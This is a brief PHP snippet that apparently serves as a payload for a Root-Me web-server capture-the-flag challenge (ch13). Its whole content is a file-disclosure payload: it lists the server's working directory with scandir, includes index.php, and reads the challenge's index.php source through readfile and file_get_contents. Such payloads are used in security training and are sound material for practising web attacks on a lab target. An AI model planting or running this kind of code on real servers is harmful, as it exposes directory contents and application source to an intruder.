<?php
  print_r(scandir('.'));
  include("index.php");
  readfile("http://challenge01.root-me.org/web-serveur/ch13/index.php");
  file_get_contents("http://challenge01.root-me.org/web-serveur/ch13/index.php");
?>
